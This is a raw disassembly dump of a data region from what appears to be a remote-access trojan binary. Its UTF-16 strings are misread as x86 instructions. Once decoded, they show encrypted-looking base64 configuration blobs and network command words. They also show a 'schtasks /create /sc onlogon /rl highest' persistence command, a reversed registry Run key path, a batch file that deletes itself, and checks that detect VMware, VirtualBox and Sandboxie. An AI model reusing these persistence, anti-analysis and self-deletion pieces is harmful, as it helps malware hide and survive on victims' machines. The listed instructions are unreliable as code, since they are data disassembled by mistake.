  40be26:	73 00                	jae    0x40be28
  40be28:	69 00 78 00 6a 00    	imul   $0x6a0078,(%eax),%eax
  40be2e:	4e                   	dec    %esi
  40be2f:	00 30                	add    %dh,(%eax)
  40be31:	00 67 00             	add    %ah,0x0(%edi)
  40be34:	77 00                	ja     0x40be36
  40be36:	62 00                	bound  %eax,(%eax)
  40be38:	50                   	push   %eax
  40be39:	00 74 00 45          	add    %dh,0x45(%eax,%eax,1)
  40be3d:	00 47 00             	add    %al,0x0(%edi)
  40be40:	65 00 58 00          	add    %bl,%gs:0x0(%eax)
  40be44:	30 00                	xor    %al,(%eax)
  40be46:	61                   	popa
  40be47:	00 36                	add    %dh,(%esi)
  40be49:	00 52 00             	add    %dl,0x0(%edx)
  40be4c:	63 00                	arpl   %eax,(%eax)
  40be4e:	63 00                	arpl   %eax,(%eax)
  40be50:	39 00                	cmp    %eax,(%eax)
  40be52:	70 00                	jo     0x40be54
  40be54:	70 00                	jo     0x40be56
  40be56:	64 00 4b 00          	add    %cl,%fs:0x0(%ebx)
  40be5a:	66 00 6d 00          	data16 add %ch,0x0(%ebp)
  40be5e:	6c                   	insb   (%dx),%es:(%edi)
  40be5f:	00 6a 00             	add    %ch,0x0(%edx)
  40be62:	35 00 56 00 76       	xor    $0x76005600,%eax
  40be67:	00 53 00             	add    %dl,0x0(%ebx)
  40be6a:	7a 00                	jp     0x40be6c
  40be6c:	78 00                	js     0x40be6e
  40be6e:	70 00                	jo     0x40be70
  40be70:	47                   	inc    %edi
  40be71:	00 53 00             	add    %dl,0x0(%ebx)
  40be74:	59                   	pop    %ecx
  40be75:	00 6e 00             	add    %ch,0x0(%esi)
  40be78:	57                   	push   %edi
  40be79:	00 32                	add    %dh,(%edx)
  40be7b:	00 6f 00             	add    %ch,0x0(%edi)
  40be7e:	58                   	pop    %eax
  40be7f:	00 7a 00             	add    %bh,0x0(%edx)
  40be82:	6b 00 35             	imul   $0x35,(%eax),%eax
  40be85:	00 70 00             	add    %dh,0x0(%eax)
  40be88:	53                   	push   %ebx
  40be89:	00 46 00             	add    %al,0x0(%esi)
  40be8c:	6b 00 33             	imul   $0x33,(%eax),%eax
  40be8f:	00 52 00             	add    %dl,0x0(%edx)
  40be92:	4a                   	dec    %edx
  40be93:	00 71 00             	add    %dh,0x0(%ecx)
  40be96:	6f                   	outsl  %ds:(%esi),(%dx)
  40be97:	00 38                	add    %bh,(%eax)
  40be99:	00 49 00             	add    %cl,0x0(%ecx)
  40be9c:	2b 00                	sub    (%eax),%eax
  40be9e:	79 00                	jns    0x40bea0
  40bea0:	68 00 52 00 43       	push   $0x43005200
  40bea5:	00 59 00             	add    %bl,0x0(%ecx)
  40bea8:	67 00 75 00          	add    %dh,0x0(%di)
  40beac:	4e                   	dec    %esi
  40bead:	00 39                	add    %bh,(%ecx)
  40beaf:	00 41 00             	add    %al,0x0(%ecx)
  40beb2:	6a 00                	push   $0x0
  40beb4:	38 00                	cmp    %al,(%eax)
  40beb6:	67 00 4b 00          	add    %cl,0x0(%bp,%di)
  40beba:	53                   	push   %ebx
  40bebb:	00 38                	add    %bh,(%eax)
  40bebd:	00 33                	add    %dh,(%ebx)
  40bebf:	00 4a 00             	add    %cl,0x0(%edx)
  40bec2:	30 00                	xor    %al,(%eax)
  40bec4:	54                   	push   %esp
  40bec5:	00 51 00             	add    %dl,0x0(%ecx)
  40bec8:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40becd:	80 b1 51 00 77 00 6d 	xorb   $0x6d,0x770051(%ecx)
  40bed4:	00 33                	add    %dh,(%ebx)
  40bed6:	00 70 00             	add    %dh,0x0(%eax)
  40bed9:	69 00 36 00 5a 00    	imul   $0x5a0036,(%eax),%eax
  40bedf:	31 00                	xor    %eax,(%eax)
  40bee1:	4c                   	dec    %esp
  40bee2:	00 50 00             	add    %dl,0x0(%eax)
  40bee5:	33 00                	xor    (%eax),%eax
  40bee7:	69 00 62 00 53 00    	imul   $0x530062,(%eax),%eax
  40beed:	70 00                	jo     0x40beef
  40beef:	6d                   	insl   (%dx),%es:(%edi)
  40bef0:	00 56 00             	add    %dl,0x0(%esi)
  40bef3:	30 00                	xor    %al,(%eax)
  40bef5:	71 00                	jno    0x40bef7
  40bef7:	4d                   	dec    %ebp
  40bef8:	00 4c 00 66          	add    %cl,0x66(%eax,%eax,1)
  40befc:	00 2f                	add    %ch,(%edi)
  40befe:	00 5a 00             	add    %bl,0x0(%edx)
  40bf01:	4c                   	dec    %esp
  40bf02:	00 76 00             	add    %dh,0x0(%esi)
  40bf05:	30 00                	xor    %al,(%eax)
  40bf07:	6c                   	insb   (%dx),%es:(%edi)
  40bf08:	00 54 00 71          	add    %dl,0x71(%eax,%eax,1)
  40bf0c:	00 77 00             	add    %dh,0x0(%edi)
  40bf0f:	76 00                	jbe    0x40bf11
  40bf11:	4b                   	dec    %ebx
  40bf12:	00 4a 00             	add    %cl,0x0(%edx)
  40bf15:	54                   	push   %esp
  40bf16:	00 63 00             	add    %ah,0x0(%ebx)
  40bf19:	77 00                	ja     0x40bf1b
  40bf1b:	61                   	popa
  40bf1c:	00 37                	add    %dh,(%edi)
  40bf1e:	00 6a 00             	add    %ch,0x0(%edx)
  40bf21:	53                   	push   %ebx
  40bf22:	00 36                	add    %dh,(%esi)
  40bf24:	00 4a 00             	add    %cl,0x0(%edx)
  40bf27:	48                   	dec    %eax
  40bf28:	00 67 00             	add    %ah,0x0(%edi)
  40bf2b:	67 00 61 00          	add    %ah,0x0(%bx,%di)
  40bf2f:	7a 00                	jp     0x40bf31
  40bf31:	2f                   	das
  40bf32:	00 37                	add    %dh,(%edi)
  40bf34:	00 59 00             	add    %bl,0x0(%ecx)
  40bf37:	33 00                	xor    (%eax),%eax
  40bf39:	57                   	push   %edi
  40bf3a:	00 44 00 46          	add    %al,0x46(%eax,%eax,1)
  40bf3e:	00 59 00             	add    %bl,0x0(%ecx)
  40bf41:	31 00                	xor    %eax,(%eax)
  40bf43:	58                   	pop    %eax
  40bf44:	00 4e 00             	add    %cl,0x0(%esi)
  40bf47:	51                   	push   %ecx
  40bf48:	00 4b 00             	add    %cl,0x0(%ebx)
  40bf4b:	4f                   	dec    %edi
  40bf4c:	00 36                	add    %dh,(%esi)
  40bf4e:	00 61 00             	add    %ah,0x0(%ecx)
  40bf51:	34 00                	xor    $0x0,%al
  40bf53:	50                   	push   %eax
  40bf54:	00 58 00             	add    %bl,0x0(%eax)
  40bf57:	4d                   	dec    %ebp
  40bf58:	00 58 00             	add    %bl,0x0(%eax)
  40bf5b:	55                   	push   %ebp
  40bf5c:	00 30                	add    %dh,(%eax)
  40bf5e:	00 7a 00             	add    %bh,0x0(%edx)
  40bf61:	4e                   	dec    %esi
  40bf62:	00 48 00             	add    %cl,0x0(%eax)
  40bf65:	4d                   	dec    %ebp
  40bf66:	00 36                	add    %dh,(%esi)
  40bf68:	00 65 00             	add    %ah,0x0(%ebp)
  40bf6b:	6f                   	outsl  %ds:(%esi),(%dx)
  40bf6c:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40bf70:	00 69 00             	add    %ch,0x0(%ecx)
  40bf73:	51                   	push   %ecx
  40bf74:	00 4f 00             	add    %cl,0x0(%edi)
  40bf77:	75 00                	jne    0x40bf79
  40bf79:	51                   	push   %ecx
  40bf7a:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40bf80:	80 b1 56 00 32 00 5a 	xorb   $0x5a,0x320056(%ecx)
  40bf87:	00 67 00             	add    %ah,0x0(%edi)
  40bf8a:	32 00                	xor    (%eax),%al
  40bf8c:	54                   	push   %esp
  40bf8d:	00 54 00 72          	add    %dl,0x72(%eax,%eax,1)
  40bf91:	00 73 00             	add    %dh,0x0(%ebx)
  40bf94:	6e                   	outsb  %ds:(%esi),(%dx)
  40bf95:	00 61 00             	add    %ah,0x0(%ecx)
  40bf98:	67 00 61 00          	add    %ah,0x0(%bx,%di)
  40bf9c:	61                   	popa
  40bf9d:	00 6e 00             	add    %ch,0x0(%esi)
  40bfa0:	50                   	push   %eax
  40bfa1:	00 6e 00             	add    %ch,0x0(%esi)
  40bfa4:	56                   	push   %esi
  40bfa5:	00 78 00             	add    %bh,0x0(%eax)
  40bfa8:	51                   	push   %ecx
  40bfa9:	00 4d 00             	add    %cl,0x0(%ebp)
  40bfac:	69 00 69 00 78 00    	imul   $0x780069,(%eax),%eax
  40bfb2:	6c                   	insb   (%dx),%es:(%edi)
  40bfb3:	00 30                	add    %dh,(%eax)
  40bfb5:	00 73 00             	add    %dh,0x0(%ebx)
  40bfb8:	42                   	inc    %edx
  40bfb9:	00 65 00             	add    %ah,0x0(%ebp)
  40bfbc:	48                   	dec    %eax
  40bfbd:	00 41 00             	add    %al,0x0(%ecx)
  40bfc0:	65 00 75 00          	add    %dh,%gs:0x0(%ebp)
  40bfc4:	76 00                	jbe    0x40bfc6
  40bfc6:	6a 00                	push   $0x0
  40bfc8:	70 00                	jo     0x40bfca
  40bfca:	4f                   	dec    %edi
  40bfcb:	00 66 00             	add    %ah,0x0(%esi)
  40bfce:	35 00 61 00 55       	xor    $0x55006100,%eax
  40bfd3:	00 64 00 34          	add    %ah,0x34(%eax,%eax,1)
  40bfd7:	00 34 00             	add    %dh,(%eax,%eax,1)
  40bfda:	52                   	push   %edx
  40bfdb:	00 2b                	add    %ch,(%ebx)
  40bfdd:	00 59 00             	add    %bl,0x0(%ecx)
  40bfe0:	64 00 48 00          	add    %cl,%fs:0x0(%eax)
  40bfe4:	77 00                	ja     0x40bfe6
  40bfe6:	39 00                	cmp    %eax,(%eax)
  40bfe8:	6d                   	insl   (%dx),%es:(%edi)
  40bfe9:	00 73 00             	add    %dh,0x0(%ebx)
  40bfec:	74 00                	je     0x40bfee
  40bfee:	76 00                	jbe    0x40bff0
  40bff0:	42                   	inc    %edx
  40bff1:	00 71 00             	add    %dh,0x0(%ecx)
  40bff4:	6a 00                	push   $0x0
  40bff6:	43                   	inc    %ebx
  40bff7:	00 6f 00             	add    %ch,0x0(%edi)
  40bffa:	61                   	popa
  40bffb:	00 72 00             	add    %dh,0x0(%edx)
  40bffe:	72 00                	jb     0x40c000
  40c000:	33 00                	xor    (%eax),%eax
  40c002:	4a                   	dec    %edx
  40c003:	00 53 00             	add    %dl,0x0(%ebx)
  40c006:	63 00                	arpl   %eax,(%eax)
  40c008:	4a                   	dec    %edx
  40c009:	00 49 00             	add    %cl,0x0(%ecx)
  40c00c:	73 00                	jae    0x40c00e
  40c00e:	4c                   	dec    %esp
  40c00f:	00 64 00 7a          	add    %ah,0x7a(%eax,%eax,1)
  40c013:	00 45 00             	add    %al,0x0(%ebp)
  40c016:	50                   	push   %eax
  40c017:	00 53 00             	add    %dl,0x0(%ebx)
  40c01a:	33 00                	xor    (%eax),%eax
  40c01c:	55                   	push   %ebp
  40c01d:	00 4d 00             	add    %cl,0x0(%ebp)
  40c020:	44                   	inc    %esp
  40c021:	00 44 00 64          	add    %al,0x64(%eax,%eax,1)
  40c025:	00 6f 00             	add    %ch,0x0(%edi)
  40c028:	71 00                	jno    0x40c02a
  40c02a:	50                   	push   %eax
  40c02b:	00 51 00             	add    %dl,0x0(%ecx)
  40c02e:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40c033:	03 33                	add    (%ebx),%esi
  40c035:	00 00                	add    %al,(%eax)
  40c037:	80 b1 43 00 4a 00 31 	xorb   $0x31,0x4a0043(%ecx)
  40c03e:	00 34 00             	add    %dh,(%eax,%eax,1)
  40c041:	6e                   	outsb  %ds:(%esi),(%dx)
  40c042:	00 74 00 4b          	add    %dh,0x4b(%eax,%eax,1)
  40c046:	00 63 00             	add    %ah,0x0(%ebx)
  40c049:	30 00                	xor    %al,(%eax)
  40c04b:	76 00                	jbe    0x40c04d
  40c04d:	76 00                	jbe    0x40c04f
  40c04f:	53                   	push   %ebx
  40c050:	00 66 00             	add    %ah,0x0(%esi)
  40c053:	43                   	inc    %ebx
  40c054:	00 51 00             	add    %dl,0x0(%ecx)
  40c057:	41                   	inc    %ecx
  40c058:	00 43 00             	add    %al,0x0(%ebx)
  40c05b:	76 00                	jbe    0x40c05d
  40c05d:	35 00 74 00 6e       	xor    $0x6e007400,%eax
  40c062:	00 57 00             	add    %dl,0x0(%edi)
  40c065:	47                   	inc    %edi
  40c066:	00 56 00             	add    %dl,0x0(%esi)
  40c069:	73 00                	jae    0x40c06b
  40c06b:	56                   	push   %esi
  40c06c:	00 45 00             	add    %al,0x0(%ebp)
  40c06f:	2f                   	das
  40c070:	00 6e 00             	add    %ch,0x0(%esi)
  40c073:	65 00 31             	add    %dh,%gs:(%ecx)
  40c076:	00 6c 00 51          	add    %ch,0x51(%eax,%eax,1)
  40c07a:	00 42 00             	add    %al,0x0(%edx)
  40c07d:	42                   	inc    %edx
  40c07e:	00 53 00             	add    %dl,0x0(%ebx)
  40c081:	4a                   	dec    %edx
  40c082:	00 51 00             	add    %dl,0x0(%ecx)
  40c085:	45                   	inc    %ebp
  40c086:	00 53 00             	add    %dl,0x0(%ebx)
  40c089:	4b                   	dec    %ebx
  40c08a:	00 75 00             	add    %dh,0x0(%ebp)
  40c08d:	6c                   	insb   (%dx),%es:(%edi)
  40c08e:	00 45 00             	add    %al,0x0(%ebp)
  40c091:	62 00                	bound  %eax,(%eax)
  40c093:	74 00                	je     0x40c095
  40c095:	65 00 6b 00          	add    %ch,%gs:0x0(%ebx)
  40c099:	2b 00                	sub    (%eax),%eax
  40c09b:	77 00                	ja     0x40c09d
  40c09d:	62 00                	bound  %eax,(%eax)
  40c09f:	67 00 61 00          	add    %ah,0x0(%bx,%di)
  40c0a3:	4f                   	dec    %edi
  40c0a4:	00 44 00 58          	add    %al,0x58(%eax,%eax,1)
  40c0a8:	00 49 00             	add    %cl,0x0(%ecx)
  40c0ab:	74 00                	je     0x40c0ad
  40c0ad:	79 00                	jns    0x40c0af
  40c0af:	38 00                	cmp    %al,(%eax)
  40c0b1:	35 00 5a 00 4f       	xor    $0x4f005a00,%eax
  40c0b6:	00 54 00 4f          	add    %dl,0x4f(%eax,%eax,1)
  40c0ba:	00 48 00             	add    %cl,0x0(%eax)
  40c0bd:	33 00                	xor    (%eax),%eax
  40c0bf:	63 00                	arpl   %eax,(%eax)
  40c0c1:	57                   	push   %edi
  40c0c2:	00 4b 00             	add    %cl,0x0(%ebx)
  40c0c5:	67 00 52 00          	add    %dl,0x0(%bp,%si)
  40c0c9:	5a                   	pop    %edx
  40c0ca:	00 31                	add    %dh,(%ecx)
  40c0cc:	00 68 00             	add    %ch,0x0(%eax)
  40c0cf:	6a 00                	push   $0x0
  40c0d1:	7a 00                	jp     0x40c0d3
  40c0d3:	4f                   	dec    %edi
  40c0d4:	00 41 00             	add    %al,0x0(%ecx)
  40c0d7:	4d                   	dec    %ebp
  40c0d8:	00 36                	add    %dh,(%esi)
  40c0da:	00 68 00             	add    %ch,0x0(%eax)
  40c0dd:	36 00 68 00          	add    %ch,%ss:0x0(%eax)
  40c0e1:	77 00                	ja     0x40c0e3
  40c0e3:	67 00 3d             	add    %bh,(%di)
  40c0e6:	00 3d 00 00 09 6e    	add    %bh,0x6e090000
  40c0ec:	00 75 00             	add    %dh,0x0(%ebp)
  40c0ef:	6c                   	insb   (%dx),%es:(%edi)
  40c0f0:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40c0f4:	01 00                	add    %eax,(%eax)
  40c0f6:	03 3a                	add    (%edx),%edi
  40c0f8:	00 00                	add    %al,(%eax)
  40c0fa:	0d 50 00 61 00       	or     $0x610050,%eax
  40c0ff:	63 00                	arpl   %eax,(%eax)
  40c101:	6b 00 65             	imul   $0x65,(%eax),%eax
  40c104:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40c108:	09 50 00             	or     %edx,0x0(%eax)
  40c10b:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40c111:	00 0f                	add    %cl,(%edi)
  40c113:	4d                   	dec    %ebp
  40c114:	00 65 00             	add    %ah,0x0(%ebp)
  40c117:	73 00                	jae    0x40c119
  40c119:	73 00                	jae    0x40c11b
  40c11b:	61                   	popa
  40c11c:	00 67 00             	add    %ah,0x0(%edi)
  40c11f:	65 00 00             	add    %al,%gs:(%eax)
  40c122:	07                   	pop    %es
  40c123:	63 00                	arpl   %eax,(%eax)
  40c125:	6d                   	insl   (%dx),%es:(%edi)
  40c126:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  40c12a:	69 2f 00 63 00 20    	imul   $0x20006300,(%edi),%ebp
  40c130:	00 73 00             	add    %dh,0x0(%ebx)
  40c133:	63 00                	arpl   %eax,(%eax)
  40c135:	68 00 74 00 61       	push   $0x61007400
  40c13a:	00 73 00             	add    %dh,0x0(%ebx)
  40c13d:	6b 00 73             	imul   $0x73,(%eax),%eax
  40c140:	00 20                	add    %ah,(%eax)
  40c142:	00 2f                	add    %ch,(%edi)
  40c144:	00 63 00             	add    %ah,0x0(%ebx)
  40c147:	72 00                	jb     0x40c149
  40c149:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40c14d:	74 00                	je     0x40c14f
  40c14f:	65 00 20             	add    %ah,%gs:(%eax)
  40c152:	00 2f                	add    %ch,(%edi)
  40c154:	00 66 00             	add    %ah,0x0(%esi)
  40c157:	20 00                	and    %al,(%eax)
  40c159:	2f                   	das
  40c15a:	00 73 00             	add    %dh,0x0(%ebx)
  40c15d:	63 00                	arpl   %eax,(%eax)
  40c15f:	20 00                	and    %al,(%eax)
  40c161:	6f                   	outsl  %ds:(%esi),(%dx)
  40c162:	00 6e 00             	add    %ch,0x0(%esi)
  40c165:	6c                   	insb   (%dx),%es:(%edi)
  40c166:	00 6f 00             	add    %ch,0x0(%edi)
  40c169:	67 00 6f 00          	add    %ch,0x0(%bx)
  40c16d:	6e                   	outsb  %ds:(%esi),(%dx)
  40c16e:	00 20                	add    %ah,(%eax)
  40c170:	00 2f                	add    %ch,(%edi)
  40c172:	00 72 00             	add    %dh,0x0(%edx)
  40c175:	6c                   	insb   (%dx),%es:(%edi)
  40c176:	00 20                	add    %ah,(%eax)
  40c178:	00 68 00             	add    %ch,0x0(%eax)
  40c17b:	69 00 67 00 68 00    	imul   $0x680067,(%eax),%eax
  40c181:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40c185:	74 00                	je     0x40c187
  40c187:	20 00                	and    %al,(%eax)
  40c189:	2f                   	das
  40c18a:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  40c18e:	00 20                	add    %ah,(%eax)
  40c190:	00 22                	add    %ah,(%edx)
  40c192:	00 00                	add    %al,(%eax)
  40c194:	11 22                	adc    %esp,(%edx)
  40c196:	00 20                	add    %ah,(%eax)
  40c198:	00 2f                	add    %ch,(%edi)
  40c19a:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40c19e:	00 20                	add    %ah,(%eax)
  40c1a0:	00 27                	add    %ah,(%edi)
  40c1a2:	00 22                	add    %ah,(%edx)
  40c1a4:	00 01                	add    %al,(%ecx)
  40c1a6:	13 22                	adc    (%edx),%esp
  40c1a8:	00 27                	add    %ah,(%edi)
  40c1aa:	00 20                	add    %ah,(%eax)
  40c1ac:	00 26                	add    %ah,(%esi)
  40c1ae:	00 20                	add    %ah,(%eax)
  40c1b0:	00 65 00             	add    %ah,0x0(%ebp)
  40c1b3:	78 00                	js     0x40c1b5
  40c1b5:	69 00 74 00 01 5d    	imul   $0x5d010074,(%eax),%eax
  40c1bb:	5c                   	pop    %esp
  40c1bc:	00 6e 00             	add    %ch,0x0(%esi)
  40c1bf:	75 00                	jne    0x40c1c1
  40c1c1:	52                   	push   %edx
  40c1c2:	00 5c 00 6e          	add    %bl,0x6e(%eax,%eax,1)
  40c1c6:	00 6f 00             	add    %ch,0x0(%edi)
  40c1c9:	69 00 73 00 72 00    	imul   $0x720073,(%eax),%eax
  40c1cf:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  40c1d3:	74 00                	je     0x40c1d5
  40c1d5:	6e                   	outsb  %ds:(%esi),(%dx)
  40c1d6:	00 65 00             	add    %ah,0x0(%ebp)
  40c1d9:	72 00                	jb     0x40c1db
  40c1db:	72 00                	jb     0x40c1dd
  40c1dd:	75 00                	jne    0x40c1df
  40c1df:	43                   	inc    %ebx
  40c1e0:	00 5c 00 73          	add    %bl,0x73(%eax,%eax,1)
  40c1e4:	00 77 00             	add    %dh,0x0(%edi)
  40c1e7:	6f                   	outsl  %ds:(%esi),(%dx)
  40c1e8:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  40c1ec:	00 69 00             	add    %ch,0x0(%ecx)
  40c1ef:	57                   	push   %edi
  40c1f0:	00 5c 00 74          	add    %bl,0x74(%eax,%eax,1)
  40c1f4:	00 66 00             	add    %ah,0x0(%esi)
  40c1f7:	6f                   	outsl  %ds:(%esi),(%dx)
  40c1f8:	00 73 00             	add    %dh,0x0(%ebx)
  40c1fb:	6f                   	outsl  %ds:(%esi),(%dx)
  40c1fc:	00 72 00             	add    %dh,0x0(%edx)
  40c1ff:	63 00                	arpl   %eax,(%eax)
  40c201:	69 00 4d 00 5c 00    	imul   $0x5c004d,(%eax),%eax
  40c207:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c20b:	61                   	popa
  40c20c:	00 77 00             	add    %dh,0x0(%edi)
  40c20f:	74 00                	je     0x40c211
  40c211:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40c215:	53                   	push   %ebx
  40c216:	00 00                	add    %al,(%eax)
  40c218:	03 22                	add    (%edx),%esp
  40c21a:	00 00                	add    %al,(%eax)
  40c21c:	09 2e                	or     %ebp,(%esi)
  40c21e:	00 62 00             	add    %ah,0x0(%edx)
  40c221:	61                   	popa
  40c222:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40c226:	13 40 00             	adc    0x0(%eax),%eax
  40c229:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c22d:	68 00 6f 00 20       	push   $0x20006f00
  40c232:	00 6f 00             	add    %ch,0x0(%edi)
  40c235:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40c239:	00 1f                	add    %bl,(%edi)
  40c23b:	74 00                	je     0x40c23d
  40c23d:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  40c243:	6f                   	outsl  %ds:(%esi),(%dx)
  40c244:	00 75 00             	add    %dh,0x0(%ebp)
  40c247:	74 00                	je     0x40c249
  40c249:	20 00                	and    %al,(%eax)
  40c24b:	33 00                	xor    (%eax),%eax
  40c24d:	20 00                	and    %al,(%eax)
  40c24f:	3e 00 20             	add    %ah,%ds:(%eax)
  40c252:	00 4e 00             	add    %cl,0x0(%esi)
  40c255:	55                   	push   %ebp
  40c256:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40c25a:	15 53 00 54 00       	adc    $0x540053,%eax
  40c25f:	41                   	inc    %ecx
  40c260:	00 52 00             	add    %dl,0x0(%edx)
  40c263:	54                   	push   %esp
  40c264:	00 20                	add    %ah,(%eax)
  40c266:	00 22                	add    %ah,(%edx)
  40c268:	00 22                	add    %ah,(%edx)
  40c26a:	00 20                	add    %ah,(%eax)
  40c26c:	00 22                	add    %ah,(%edx)
  40c26e:	00 00                	add    %al,(%eax)
  40c270:	07                   	pop    %es
  40c271:	43                   	inc    %ebx
  40c272:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  40c276:	00 00                	add    %al,(%eax)
  40c278:	0b 44 00 45          	or     0x45(%eax,%eax,1),%eax
  40c27c:	00 4c 00 20          	add    %cl,0x20(%eax,%eax,1)
  40c280:	00 22                	add    %ah,(%edx)
  40c282:	00 00                	add    %al,(%eax)
  40c284:	0f 22 00             	mov    %eax,%cr0
  40c287:	20 00                	and    %al,(%eax)
  40c289:	2f                   	das
  40c28a:	00 66 00             	add    %ah,0x0(%esi)
  40c28d:	20 00                	and    %al,(%eax)
  40c28f:	2f                   	das
  40c290:	00 71 00             	add    %dh,0x0(%ecx)
  40c293:	00 05 78 00 70 00    	add    %al,0x700078
  40c299:	00 45 53             	add    %al,0x53(%ebp)
  40c29c:	00 65 00             	add    %ah,0x0(%ebp)
  40c29f:	6c                   	insb   (%dx),%es:(%edi)
  40c2a0:	00 65 00             	add    %ah,0x0(%ebp)
  40c2a3:	63 00                	arpl   %eax,(%eax)
  40c2a5:	74 00                	je     0x40c2a7
  40c2a7:	20 00                	and    %al,(%eax)
  40c2a9:	2a 00                	sub    (%eax),%al
  40c2ab:	20 00                	and    %al,(%eax)
  40c2ad:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40c2b1:	6f                   	outsl  %ds:(%esi),(%dx)
  40c2b2:	00 6d 00             	add    %ch,0x0(%ebp)
  40c2b5:	20 00                	and    %al,(%eax)
  40c2b7:	57                   	push   %edi
  40c2b8:	00 69 00             	add    %ch,0x0(%ecx)
  40c2bb:	6e                   	outsb  %ds:(%esi),(%dx)
  40c2bc:	00 33                	add    %dh,(%ebx)
  40c2be:	00 32                	add    %dh,(%edx)
  40c2c0:	00 5f 00             	add    %bl,0x0(%edi)
  40c2c3:	43                   	inc    %ebx
  40c2c4:	00 6f 00             	add    %ch,0x0(%edi)
  40c2c7:	6d                   	insl   (%dx),%es:(%edi)
  40c2c8:	00 70 00             	add    %dh,0x0(%eax)
  40c2cb:	75 00                	jne    0x40c2cd
  40c2cd:	74 00                	je     0x40c2cf
  40c2cf:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c2d3:	53                   	push   %ebx
  40c2d4:	00 79 00             	add    %bh,0x0(%ecx)
  40c2d7:	73 00                	jae    0x40c2d9
  40c2d9:	74 00                	je     0x40c2db
  40c2db:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40c2df:	00 19                	add    %bl,(%ecx)
  40c2e1:	4d                   	dec    %ebp
  40c2e2:	00 61 00             	add    %ah,0x0(%ecx)
  40c2e5:	6e                   	outsb  %ds:(%esi),(%dx)
  40c2e6:	00 75 00             	add    %dh,0x0(%ebp)
  40c2e9:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40c2ed:	63 00                	arpl   %eax,(%eax)
  40c2ef:	74 00                	je     0x40c2f1
  40c2f1:	75 00                	jne    0x40c2f3
  40c2f3:	72 00                	jb     0x40c2f5
  40c2f5:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c2f9:	00 2b                	add    %ch,(%ebx)
  40c2fb:	6d                   	insl   (%dx),%es:(%edi)
  40c2fc:	00 69 00             	add    %ch,0x0(%ecx)
  40c2ff:	63 00                	arpl   %eax,(%eax)
  40c301:	72 00                	jb     0x40c303
  40c303:	6f                   	outsl  %ds:(%esi),(%dx)
  40c304:	00 73 00             	add    %dh,0x0(%ebx)
  40c307:	6f                   	outsl  %ds:(%esi),(%dx)
  40c308:	00 66 00             	add    %ah,0x0(%esi)
  40c30b:	74 00                	je     0x40c30d
  40c30d:	20 00                	and    %al,(%eax)
  40c30f:	63 00                	arpl   %eax,(%eax)
  40c311:	6f                   	outsl  %ds:(%esi),(%dx)
  40c312:	00 72 00             	add    %dh,0x0(%edx)
  40c315:	70 00                	jo     0x40c317
  40c317:	6f                   	outsl  %ds:(%esi),(%dx)
  40c318:	00 72 00             	add    %dh,0x0(%edx)
  40c31b:	61                   	popa
  40c31c:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40c320:	00 6f 00             	add    %ch,0x0(%edi)
  40c323:	6e                   	outsb  %ds:(%esi),(%dx)
  40c324:	00 00                	add    %al,(%eax)
  40c326:	0b 4d 00             	or     0x0(%ebp),%ecx
  40c329:	6f                   	outsl  %ds:(%esi),(%dx)
  40c32a:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40c32e:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40c332:	0f 56 00             	orps   (%eax),%xmm0
  40c335:	49                   	dec    %ecx
  40c336:	00 52 00             	add    %dl,0x0(%edx)
  40c339:	54                   	push   %esp
  40c33a:	00 55 00             	add    %dl,0x0(%ebp)
  40c33d:	41                   	inc    %ecx
  40c33e:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40c342:	0d 76 00 6d 00       	or     $0x6d0076,%eax
  40c347:	77 00                	ja     0x40c349
  40c349:	61                   	popa
  40c34a:	00 72 00             	add    %dh,0x0(%edx)
  40c34d:	65 00 00             	add    %al,%gs:(%eax)
  40c350:	15 56 00 69 00       	adc    $0x690056,%eax
  40c355:	72 00                	jb     0x40c357
  40c357:	74 00                	je     0x40c359
  40c359:	75 00                	jne    0x40c35b
  40c35b:	61                   	popa
  40c35c:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  40c360:	00 6f 00             	add    %ch,0x0(%edi)
  40c363:	78 00                	js     0x40c365
  40c365:	00 17                	add    %dl,(%edi)
  40c367:	53                   	push   %ebx
  40c368:	00 62 00             	add    %ah,0x0(%edx)
  40c36b:	69 00 65 00 44 00    	imul   $0x440065,(%eax),%eax
  40c371:	6c                   	insb   (%dx),%es:(%edi)
  40c372:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40c376:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40c37a:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40c37e:	11 45 00             	adc    %eax,0x0(%ebp)
  40c381:	72 00                	jb     0x40c383
  40c383:	72 00                	jb     0x40c385
  40c385:	20 00                	and    %al,(%eax)
  40c387:	48                   	dec    %eax
  40c388:	00 57 00             	add    %dl,0x0(%edi)
  40c38b:	49                   	dec    %ecx
  40c38c:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40c390:	05 78 00 32 00       	add    $0x320078,%eax
